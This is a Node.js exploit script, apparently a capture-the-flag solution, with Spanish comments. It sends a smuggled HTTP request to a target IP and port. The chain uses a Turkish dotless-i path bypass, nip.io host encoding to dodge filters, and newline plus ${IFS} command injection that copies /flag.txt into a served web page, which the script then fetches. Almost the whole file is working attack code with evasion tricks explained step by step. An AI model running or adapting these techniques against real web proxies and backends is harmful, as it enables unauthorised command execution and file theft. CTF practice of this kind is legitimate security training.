#!/usr/bin/env node

// Importamos modulo net para poder abrir conexiones TCP
const net = require("net");


// IP y PORT brindados por la pagina del CTF
const TARGET = "154.57.164.71";
const PORT = 32134;


// Payload con Command Injection
// Cuando el backend lo ejecute haria lo siguiente:
// ip addr flush lo
// cp /flag.txt /app/proxy/includes/index.html
const payloadBody = Buffer.from(
    '{"interface":"lo\\ncp${IFS}/flag.txt${IFS}/app/proxy/includes/index.html"}'
)
// importante el salto de linea \n que provoca que el segundo comando
// se ejecute de forma independiente
// ademas utiliza ${IFS} porque en Bash representa un espacio,
// evitando asi demas filtros


// Primera petición: cuerpo válido de 2 bytes
const body1 = Buffer.from("{}");
// Esta peticion solo sirve para preparar el entorno


// Segunda petición (la que queremos smugglear)
// busca acceder a /flushInterface (ruta protegida del backend)
// codifica la ip 10.244.3.77 con nip.io para evitar deteccion
// y ademas con - para evitar filtros
const secondReq = Buffer.concat([
    Buffer.from(
        "POST /flushInterface HTTP/1.1\r\n" +
        "Host: 10-244-3-77.nip.io:5000\r\n" +
        "Content-Type: application/json\r\n" +
        `Content-Length: ${payloadBody.length}\r\n` +
        "\r\n"
    ),
    payloadBody
]);


// Primera petición con Turkish dotless i
// Logra acceder a /flushInterface debido a la normalizacion aplicada
// por el proxy con la i turca
// mismo metodo para camuflar la ip de redireccion al backend
const firstReq = Buffer.from(
    "POST /flush\u0131nterface HTTP/1.1\r\n" +
    "Host: 10-244-3-77.nip.io:5000\r\n" +
    "Content-Type: application/json\r\n" +
    "Content-Length: 2\r\n" +
    "\r\n"
);


// Unión completa del request smuggleado
// unimos los 4 bloques entonces
const fullRequest = Buffer.concat([
    firstReq,
    body1,
    Buffer.from("\r\n\r\n"),
    secondReq
]);


console.log("Enviando request...");


// Apertura del socket TCP de bajo nivel, ninguna abstraccion HTTP
const client = new net.Socket();
client.setTimeout(30000);


// Apertura de la conexion
client.connect(PORT, TARGET, () => {
    console.log("Conectado");
    client.write(fullRequest);
});


// Recepcion de la respuesta
client.on("data", (data) => {
    console.log("[*] Response:");
    console.log(data.toString());
    client.destroy();

    // Esperamos ejecución
    setTimeout(fetchFlag, 1000);
});

client.on("error", (err) => {
    console.error(err.message);
});


// Metodo para traer flag una vez que ya se haya sobreescrito el html
// con el smuggler
function fetchFlag() {
    
    console.log("Pidiendo la flag...");

    const client2 = new net.Socket();

    const req =
        "GET / HTTP/1.1\r\n" +
        "Host: test.com:80\r\n" +
        "\r\n";

    // Abre conexion
    client2.connect(PORT, TARGET, () => {
        client2.write(req);
    });

    // Imprime la flag almacenada en la data del socket TCP
    client2.on("data", (data) => {
        console.log("Flag:");
        console.log(data.toString());

        client2.destroy();
    });
    
    client2.on("error", (err) => {
        console.error(err.message);
    });
}